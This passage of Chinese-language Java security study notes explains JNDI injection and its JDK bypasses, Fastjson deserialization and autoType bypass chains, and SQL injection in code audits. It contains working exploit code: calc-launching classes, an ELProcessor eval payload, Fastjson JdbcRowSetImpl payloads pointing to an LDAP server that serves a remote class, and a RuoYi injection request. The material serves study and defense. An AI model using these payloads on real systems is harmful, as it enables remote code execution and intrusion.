        //其中RemoteObjImpl类的实现与RMI中一致
        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());

    }
}

```

`JNDIRMIClient.java`

```java 
import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}

```

#### RMI原生漏洞

api虽然是JNDI服务的但实际上调用的还是RMI库中的原生`lookup()`

调用`lookup()`处下断点

![Snipaste_2025-04-07_10-57-38](JAVA安全/Snipaste_2025-04-07_10-57-38.png)

- 跟进断点，先调用`initialContext.lookup()`

  ![Snipaste_2025-04-07_10-58-14](JAVA安全/Snipaste_2025-04-07_10-58-14.png)

- 继续跟进到`RegistryContext`类中，可以看到调用的是原生的RMI服务也就意味着也存在RMI中的漏洞

  ![Snipaste_2025-04-07_10-58-51](JAVA安全/Snipaste_2025-04-07_10-58-51.png)

  ![Snipaste_2025-04-07_10-59-08](JAVA安全/Snipaste_2025-04-07_10-59-08.png)

#### Reference引用漏洞

服务端代码改为以下内容

```java
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("JNDICalc", "JNDICalc", "http://localhost:5791/");
        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
    }
}

```

- `Reference`构造函数，使用`factory`来表示一个类，然后给出`factory`地址来进行远程类加载

  ![Snipaste_2025-04-07_12-21-05](JAVA安全/Snipaste_2025-04-07_12-21-05.png)

  - `JNDICalc`代码如下

    ```java
    public class JndiCalc {  
        public JndiCalc() throws Exception {  
            Runtime.getRuntime().exec("calc");  
     }  
    }
    ```

- 还是跟进`RegistryContext.lookup()`

  ![Snipaste_2025-04-07_12-26-20](JAVA安全/Snipaste_2025-04-07_12-26-20.png)

  - 此处绑定的并不是`Reference`，可以在服务端下断点跟踪一下为什么

    ![Snipaste_2025-04-07_13-47-30](JAVA安全/Snipaste_2025-04-07_13-47-30.png)

  - 跟进到`encodeObject()`

    ![Snipaste_2025-04-07_12-28-00](JAVA安全/Snipaste_2025-04-07_12-28-00.png)

    ![Snipaste_2025-04-07_12-35-40](JAVA安全/Snipaste_2025-04-07_12-35-40.png)

    - 可以看到在此处换了一个新类

- 继续跟踪类的加载过程，跟进`lookup()`下的`decodeObject`

  ![Snipaste_2025-04-07_13-52-34](JAVA安全/Snipaste_2025-04-07_13-52-34.png)

  - 然后调用`NamingManager.getObjectInstance()`

    ![Snipaste_2025-04-07_12-38-21](JAVA安全/Snipaste_2025-04-07_12-38-21.png)

  - 一直到其中获取`factory`的地方，获得恶意类名称

    ![Snipaste_2025-04-07_12-39-51](JAVA安全/Snipaste_2025-04-07_12-39-51.png)

  - 然后进行类加载，先用`AppClassLoade`r进行本地类加载，加载不到class为null

    ![Snipaste_2025-04-07_12-40-35](JAVA安全/Snipaste_2025-04-07_12-40-35.png)

    ![Snipaste_2025-04-07_12-41-00](JAVA安全/Snipaste_2025-04-07_12-41-00.png)

  - 然后通过服务端绑定的地址进行远程加载

    ![Snipaste_2025-04-07_14-00-07](JAVA安全/Snipaste_2025-04-07_14-00-07.png)

    ![Snipaste_2025-04-07_12-53-59](JAVA安全/Snipaste_2025-04-07_12-53-59.png)

  - 最后通过`newInstance()`执行，因为恶意代码写在类的构造函数中

    ![Snipaste_2025-04-07_13-00-59](JAVA安全/Snipaste_2025-04-07_13-00-59.png)

- 此漏洞就是JNDI专属的URLClassLoader的动态恶意类加载，在jdk8u121中修复，只允许客户端的`lookup()`进行本地方法调用

#### LDAP引用漏洞

针对于引用漏洞JDK在8u121后做了修复，在`RegistryContext`，`CNCtx`中添加了`trustURLCodebase`并默认为false，`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");`

修复代码如下

```java
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 } else {  
 return null;  
 }  
 }
```

但对于JDK版本介于8u121-8u191、7u131-7u201与6u141-6u211之间时，可以用LDAP+Reference绕过

基本的处理逻辑和RMI引用漏洞一致，只不过JNDI是在`LdapCtx`类中处理LDAP服务

- 先对对象进行`decodeObject()`

  ![Snipaste_2025-04-07_21-06-33](JAVA安全/Snipaste_2025-04-07_21-06-33.png)

  - 解析`Reference`对象

    ![Snipaste_2025-04-07_21-08-45](JAVA安全/Snipaste_2025-04-07_21-08-45.png)

- 然后进行远程类加载，此处也不一样，调用的是`DirectoryManager.getObjectInstance()`

  ![Snipaste_2025-04-07_21-09-54](JAVA安全/Snipaste_2025-04-07_21-09-54.png)

  - 同样调用`getObjectFactoryFromReference()`，此后的代码逻辑就一样了

    ![Snipaste_2025-04-07_21-15-14](JAVA安全/Snipaste_2025-04-07_21-15-14.png)

    - 之后同样本地类加载不到，然后获取codebase也就是reference地址，通过`URLClassLoader`进行远程类加载，最后实例化触发构造函数中的恶意函数

#### jdk8u191之后绕过

恶意服务端代码

```java
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;

public class JNDIRMIByPassServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                        ".newInstance().getEngineByName(\"JavaScript\")" +
                        ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                        "(['cmd', '/c', 'calc']).start()\")";
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",
                true,"org.apache.naming.factory.BeanFactory",null );
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", payload));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
    }
}

```

同样在客户端`lookup()`处下断点

![Snipaste_2025-04-08_12-27-25](JAVA安全/Snipaste_2025-04-08_12-27-25.png)

- 同样在`RegistryContext`中进入`NamingManager.getObjectInstance`

  ![Snipaste_2025-04-08_12-28-22](JAVA安全/Snipaste_2025-04-08_12-28-22.png)

  - 获取factory

    ![Snipaste_2025-04-07_21-15-14](JAVA安全/Snipaste_2025-04-07_21-15-14.png)

  - 直接加载本地`BeanFactory`类

    ![Snipaste_2025-04-08_12-31-27](JAVA安全/Snipaste_2025-04-08_12-31-27.png)

- 跟进 `getObjectInstance()` 

  ![Snipaste_2025-04-08_11-04-14](JAVA安全/Snipaste_2025-04-08_11-04-14.png)

  - 这里判断obj参数是否是`ResourceRef`类实例，所以构造`Reference`类实例时要用`ResourceRef`创建

    ![Snipaste_2025-04-08_12-34-50](JAVA安全/Snipaste_2025-04-08_12-34-50.png)

  - 接着获取 Bean 类为 `javax.el.ELProcessor` 后，实例化该类并获取其中的 `forceString` 类型的内容，其值就是构造的 `x=eval` 内容

    ![Snipaste_2025-04-08_11-05-16](JAVA安全/Snipaste_2025-04-08_11-05-16.png)

  - 查找 `forceString` 的内容中是否存在”=”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，**之前设置的 `forceString` 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 `BeanFactory` 类能进行利用的关键点！**

    ![Snipaste_2025-04-08_11-08-17](JAVA安全/Snipaste_2025-04-08_11-08-17.png)

  - 获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()反射调用执行

    ![Snipaste_2025-04-08_11-09-52](JAVA安全/Snipaste_2025-04-08_11-09-52.png)

### Fastjson反序列化

#### 调用流程

重写了很多`parse`或`parseObject`方法

![Snipaste_2025-04-24_11-20-11](JAVA安全/Snipaste_2025-04-24_11-20-11.png)

使用`parseObject`进行JSON反序列化

![Snipaste_2025-04-24_11-05-50](JAVA安全/Snipaste_2025-04-24_11-05-50.png)

不管调用哪个方法最终都会进入`DefaultJSONParser`

![Snipaste_2025-04-24_11-21-13](JAVA安全/Snipaste_2025-04-24_11-21-13.png)

![Snipaste_2025-04-24_11-23-55](JAVA安全/Snipaste_2025-04-24_11-23-55.png)

![Snipaste_2025-04-24_11-26-41](JAVA安全/Snipaste_2025-04-24_11-26-41.png)

然后会从反序列化Json字节码转为加载指定的Java类，此处的key=@type，value为指定的Java类

![Snipaste_2025-04-24_11-31-41](JAVA安全/Snipaste_2025-04-24_11-31-41.png)

调用反序列化解析器

![Snipaste_2025-04-24_11-33-02](JAVA安全/Snipaste_2025-04-24_11-33-02.png)

- 默认有自带的解析器

  ![Snipaste_2025-04-24_11-33-33](JAVA安全/Snipaste_2025-04-24_11-33-33.png)

- 但是因为加载的是自定义的Java类，并未预先注册，所以为该类创建专用的`JavaBeanDeserializer`

![Snipaste_2025-04-24_11-36-57](JAVA安全/Snipaste_2025-04-24_11-36-57.png)

创建`JavaBean`通过反射分析目标类的成员，这里的漏洞点就是获得变量field以及其setter和getter方法

![Snipaste_2025-04-24_12-24-31](JAVA安全/Snipaste_2025-04-24_12-24-31.png)

- 其中会调用`setter`和`getter`方法

  ![Snipaste_2025-04-24_12-36-47](JAVA安全/Snipaste_2025-04-24_12-36-47-17454749887491.png)

  - 调用setter的条件

    ![Snipaste_2025-04-24_12-30-13](JAVA安全/Snipaste_2025-04-24_12-30-13.png)

    ![Snipaste_2025-04-24_12-32-31](JAVA安全/Snipaste_2025-04-24_12-32-31.png)

  - 调用getter的条件

    ![Snipaste_2025-04-24_12-38-13](JAVA安全/Snipaste_2025-04-24_12-38-13.png)

  - 并且会将遍历出的setter或getter添加进`fieldList`，有setter的变量优先放入，此后的getter不放入
  
    ![Snipaste_2025-04-24_12-36-47](JAVA安全/Snipaste_2025-04-24_12-36-47.png)
  
    ![Snipaste_2025-04-24_12-36-47-17454749887491](JAVA安全/Snipaste_2025-04-24_12-36-47-17454749887491.png)

因为FastJson的ASM优化会将反序列化的具体细节分装在动态生成的字节码类中，导致无法了解调试细节，所以为了继续调试需要将asmEnable设置false。

- 以下仅是为了能够看到调试细节与漏洞原理无关

  - 创建一个新的变量只有getter

  ![Snipaste_2025-04-24_13-06-47](JAVA安全/Snipaste_2025-04-24_13-06-47.png)

  - 使getOnly为true，这里的if判断方法是否是setter

  ![Snipaste_2025-04-24_13-07-48](JAVA安全/Snipaste_2025-04-24_13-07-48.png)

  - 使asmEnable为false

  ![Snipaste_2025-04-24_13-13-09](JAVA安全/Snipaste_2025-04-24_13-13-09.png)

  - 进入具体的反序列化流程

  ![Snipaste_2025-04-24_13-13-29](JAVA安全/Snipaste_2025-04-24_13-13-29.png)

##### setter调用流程

- 首先创建类实例

  ![Snipaste_2025-04-24_13-22-15](JAVA安全/Snipaste_2025-04-24_13-22-15.png)

- 调用setter赋值

  ![Snipaste_2025-04-24_13-23-40](JAVA安全/Snipaste_2025-04-24_13-23-40.png)

  - 在`setValue`中调用invoke执行

    ![Snipaste_2025-04-24_13-24-29](JAVA安全/Snipaste_2025-04-24_13-24-29.png)

- 最后会返回赋的值

  ![Snipaste_2025-04-24_13-29-49](JAVA安全/Snipaste_2025-04-24_13-29-49.png)

##### getter调用流程

将获得的Java对象转换为JSON是会调用方法

![Snipaste_2025-04-24_13-38-05](JAVA安全/Snipaste_2025-04-24_13-38-05.png)

- 然后在JSON中调用`getFieldValuesMap`

  ![Snipaste_2025-04-24_13-42-48](JAVA安全/Snipaste_2025-04-24_13-42-48.png)

  - 继续跟进

    ![Snipaste_2025-04-24_13-34-08](JAVA安全/Snipaste_2025-04-24_13-34-08.png)

  - 最后在get在调用getter

    ![Snipaste_2025-04-24_13-34-57](JAVA安全/Snipaste_2025-04-24_13-34-57.png)

#### 漏洞原理总结

1. `@type`指定**任意**恶意类
2. `JavaBeanInfo`解析类结构（未过滤危险的**setter**或getter）
3. `JavaBeanDeserializer`反序列化
4. 恶意方法执行

Fastjson通过提取恶意的setter和getter方法并放入fieldList导致在后面反序列化时自动调用了这些方法导致命令执行

**修复方法**

- `Fastjson`无条件信任`JavaBeanInfo`解析的类结构，所以要在此之前阻止恶意类的加载
  - **autoType**白名单，在`checkAutoType()`阶段拦截非信任类，使其无法进入`JavaBeanInfo`构建流程。
  - **SafeMode**，禁用@type使之无法指定恶意类加载，仅允许加载已注册的安全的类

#### 基于 JdbcRowSetImpl 的利用链

版本限制在**Fastjson 1.2.24**，然后因为本质是利用了JNDI注入所以需要**出网**

在`JdbcRowSetImpl`中有lookup方法可以解析JNDI的服务地址

![Snipaste_2025-04-24_21-00-09](JAVA安全/Snipaste_2025-04-24_21-00-09.png)

而`DataSourceName`是可以通过Fastjson控制的，因为其有满足条件的setter

![Snipaste_2025-04-24_21-00-35](JAVA安全/Snipaste_2025-04-24_21-00-35.png)

所以接下来就是要找到可以控制coonect()的方法，这里找到`setAutoCommit`，这里还有另外一个getter，但是优先选择setter，因为到触发getter的`toJSON()`前有更多的条件判断

![Snipaste_2025-04-24_21-02-22](JAVA安全/Snipaste_2025-04-24_21-02-22.png)

EXP如下

```java
package Fastjson;

import com.alibaba.fastjson.JSON;

public class JdbcRowSetImplExp {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.13.1:1389/aenhsl\", \"autoCommit\":false}";
        JSON.parseObject(payload);
    }
}
```

先调用setDataSourceName赋值远程服务地址，在调用setAutoCommit触发`connect()`，然后触发`connect.lookup()`，ldap地址通过`JNDI-Injection-Exploit`生成

#### 高版本绕过

##### 修复原理

`DefaultJSONParser.parseObject`原本是直接通过`TypeUtils.loadClass`加载Java对象，现在改为了`checkAutoType`过滤类，其中`autoTypeSupport`默认关闭

![Snipaste_2025-04-25_10-36-40](JAVA安全/Snipaste_2025-04-25_10-36-40.png)

然后过滤类中有两种过滤方式

黑名单过滤的类

```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

- 当`autoTypeSupport`开启时

  ```java
  //1.2.28黑名单指定字段
  if (autoTypeSupport || expectClass != null) {
          for (int i = 0; i < acceptList.length; ++i) {
              String accept = acceptList[i];
              if (className.startsWith(accept)) {
                  //加载白名单中的类，不可控
                  return TypeUtils.loadClass(typeName, defaultClassLoader);
              }
          }
   
          for (int i = 0; i < denyList.length; ++i) {
              String deny = denyList[i];
              //过滤黑名单中的类
              if (className.startsWith(deny)) {
                  throw new JSONException("autoType is not support. " + typeName);
              }
          }
      }
  
  //1.2.47黑名单指定hash
  if (autoTypeSupport || expectClass != null) {
              long hash = h3;
              for (int i = 3; i < className.length(); ++i) {
                  hash ^= className.charAt(i);
                  hash *= PRIME;
                  if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                      if (clazz != null) {
                          return clazz;
                      }
                  }
                  if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                      throw new JSONException("autoType is not support. " + typeName);
                  }
              }
          }
  ```

- 当`autoTypeSupport`关闭时

  ```java
  //1.2.28黑名单指定字段
  if (!autoTypeSupport) {
          for (int i = 0; i < denyList.length; ++i) {
              String deny = denyList[i];
              //先黑名单过滤
              if (className.startsWith(deny)) {
                  throw new JSONException("autoType is not support. " + typeName);
              }
          }
          for (int i = 0; i < acceptList.length; ++i) {
              String accept = acceptList[i];
              if (className.startsWith(accept)) {
                  //再加载白名单的类
                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
   
                  if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                      throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                  }
                  return clazz;
              }
          }
      }
  
  //1.2.47
  if (!autoTypeSupport) {
              long hash = h3;
              for (int i = 3; i < className.length(); ++i) {
                  char c = className.charAt(i);
                  hash ^= c;
                  hash *= PRIME;
  
                  if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
                      throw new JSONException("autoType is not support. " + typeName);
                  }
  
                  if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                      if (clazz == null) {
                          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                      }
  
                      if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                          throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                      }
  
                      return clazz;
                  }
              }
          }
  ```

##### 1.2.25 - 1.2.41绕过

开启`autoTypeSupport`，传入的恶意类格式为LCLASSPATH;

这里的EXP为

```java
public class JdbcRowSetImplExp {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://192.168.13.1:1389/wbidzf\", \"autoCommit\":false}";
        JSON.parseObject(payload);
    }
}
```

下面分析流程

前面流程不变主要是`autoTypeSupport`中会进入第一个过滤检测

![Snipaste_2025-04-25_10-55-04](JAVA安全/Snipaste_2025-04-25_10-55-04.png)

传入的类是`Lcom.sun.rowset.JdbcRowSetImpl;`不在黑名单中，然后下面直接进行Java类加载，若关闭就会报异常

![Snipaste_2025-04-25_10-55-22](JAVA安全/Snipaste_2025-04-25_10-55-22.png)

最后会在类加载中去掉L和;然后恶意类代入后面的流程，进行赋值调用

![Snipaste_2025-04-25_10-56-06](JAVA安全/Snipaste_2025-04-25_10-56-06.png)

##### 1.2.25-1.2.47通杀绕过

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能成功触发，因为通过Class类加载恶意类时会进入第一个过滤判断导致抛出异常

- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；

  ```java
  if (autoTypeSupport || expectClass != null) {
      long hash = h3;
      for (int i = 3; i < className.length(); ++i) {
          hash ^= className.charAt(i);
          hash *= PRIME;
          // 1. 如果在白名单（acceptHashCodes），直接加载类
          if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
              clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
              if (clazz != null) {
                  return clazz;
              }
          }
          // 2. 如果在黑名单（denyHashCodes），且不在缓存（mapping）里，抛出异常，在第一部分已经将恶意类加载进缓存了所以第一次过滤始终都可以绕过
          if (Arrays.binarySearch(denyHashCodes, hash) >= 0 
                  && TypeUtils.getClassFromMapping(typeName) == null) {
              throw new JSONException("autoType is not support. " + typeName);
          }
      }
  }
  ```

  

漏洞点出现在`ParserConfig.checkAutoType`中，会从缓存中加载类，所以要将恶意类放入缓存中

```java
Class<?> clazz = TypeUtils.getClassFromMapping(typeName);

//TypeUtils类中
public static Class<?> getClassFromMapping(String className) {
    //可以从缓存中获取类
    return mappings.get(className);
}
```

而在`TypeUtils.loadClass`中有放入缓存的操作

![Snipaste_2025-04-25_12-45-53](JAVA安全/Snipaste_2025-04-25_12-45-53.png)

接下来就要找可控`TypeUtils.loadClass`并能放入恶意类的地方，找到`MiscCodec.deserialze`，当传入Class类即可触发该方法，而strVal既是放入恶意类的地方，参数名为val

![Snipaste_2025-04-25_12-48-03](JAVA安全/Snipaste_2025-04-25_12-48-03.png)

传入Class.class调用的就是MiscCodec反序列化器

![Snipaste_2025-04-25_12-55-28](JAVA安全/Snipaste_2025-04-25_12-55-28.png)

EXP

```java
 public static void main(String[] args) {
        String payload = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.13.1:1389/wbidzf\", \"autoCommit\":false}\"}";
        JSON.parseObject(payload);
    }
```

调用流程

- 扫描第一部分JSON数据时checkAutoType返回Class类

  ![Snipaste_2025-04-25_13-04-45](JAVA安全/Snipaste_2025-04-25_13-04-45.png)

- 然后通过MiscCodec解析Class类

  ![Snipaste_2025-04-25_13-07-45](JAVA安全/Snipaste_2025-04-25_13-07-45.png)

  - 提取键值val给objVal赋值

    ![Snipaste_2025-04-25_13-30-41](JAVA安全/Snipaste_2025-04-25_13-30-41.png)

  - objVal给strVal赋值，strVal中传入恶意类

    ![Snipaste_2025-04-25_13-31-05](JAVA安全/Snipaste_2025-04-25_13-31-05.png)

  - 满足条件调用`TypeUtils.loadClass`将恶意类放入缓存

    ![Snipaste_2025-04-25_13-08-34](JAVA安全/Snipaste_2025-04-25_13-08-34.png)

    ![Snipaste_2025-04-25_13-09-47](JAVA安全/Snipaste_2025-04-25_13-09-47.png)

- 扫描第二部分JSON数据，也就是第二次调用`checkAutoType`时会从缓存中查出恶意类并返回进入后续流程，此版本没开启AutoTypeSupport跳过第一个过滤，然后在第二个过滤前就查出类并返回了，也就跳过了第二次过滤

  ![Snipaste_2025-04-25_13-11-54](JAVA安全/Snipaste_2025-04-25_13-11-54.png)

## Java代码审计

### SQL注入

#### 原生JDBC

搜索append，+等未经预编译的参数拼接语句

**jfinal**

orderBy为可控变量，路由为/admin/advicefeedback/list

![Snipaste_2025-04-25_20-20-21](JAVA安全/Snipaste_2025-04-25_20-20-21-174558393053216.png)

- orderBy = getBaseForm().getOrderBy()

  ![Snipaste_2025-04-25_20-21-38](JAVA安全/Snipaste_2025-04-25_20-21-38.png)

  ![Snipaste_2025-04-25_20-22-06](JAVA安全/Snipaste_2025-04-25_20-22-06.png)

  ![Snipaste_2025-04-25_20-22-18](JAVA安全/Snipaste_2025-04-25_20-22-18-174558376339914.png)

  - 所以变量名为form.orderColumn

#### Mybatis

开发的原则是能使用`#{}`的地方，一定使用`#{}`。但是SQL语句中存在无法使用`#{}`的场景，因为使用`#{}`会在原本的字段加上引号`''`，导致SQL语句报错。不能使用`#{}`的场景我们需要特别注意，此处极易产生SQL注入。

不能使用`#{}`的场景有：

1. 表名/字段名
2. order by/group by append
3. like模糊查询
4. in

**若依4.6**

判断模式

- 根据代码结构中有mybatis-config，以及.xml格式文件中有sql语句判断利用的是Mybatis框架

搜索注入点

- 搜索${

  ![Snipaste_2025-04-25_19-25-03](JAVA安全/Snipaste_2025-04-25_19-25-03.png)

跟踪代码找到路由

- 在`SysDeptMapper`找到`updateDeptStatus`

  ![Snipaste_2025-04-25_19-25-36](JAVA安全/Snipaste_2025-04-25_19-25-36.png)

- `SysDeptServiceImp`l实现接口

  ![Snipaste_2025-04-25_19-26-04](JAVA安全/Snipaste_2025-04-25_19-26-04.png)

  ![Snipaste_2025-04-25_19-26-55](JAVA安全/Snipaste_2025-04-25_19-26-55.png)

- 最后找到Controller中的路由

  ![Snipaste_2025-04-25_19-28-33](JAVA安全/Snipaste_2025-04-25_19-28-33.png)

通过路由找到功能点测试漏洞点

- 原始包

  ![Snipaste_2025-04-25_19-31-36](JAVA安全/Snipaste_2025-04-25_19-31-36.png)

- 这里要修改原始包使代码走向想要调用的sql语句，这里只添加了目标sql变量ancestors以及将parentId改为1即可

  ![Snipaste_2025-04-25_19-40-43](JAVA安全/Snipaste_2025-04-25_19-40-43-17455814212368.png)

  - 根据源码保留字段也可以，只是不知道orderNum在哪里，但是不写就报错

    ```html
    deptId=101&parentId=1&parentName=1&deptName=2&orderNum=1&status=0&ancestors=1)
    ```

    

### 文件操作

### 身份鉴权

### 第三方组件

### SSTI

### RCE

## 内存马

### 传统web应用

- Listener
- Filter
- Servlet

### 框架



### 中间件



### Agent



### 其它

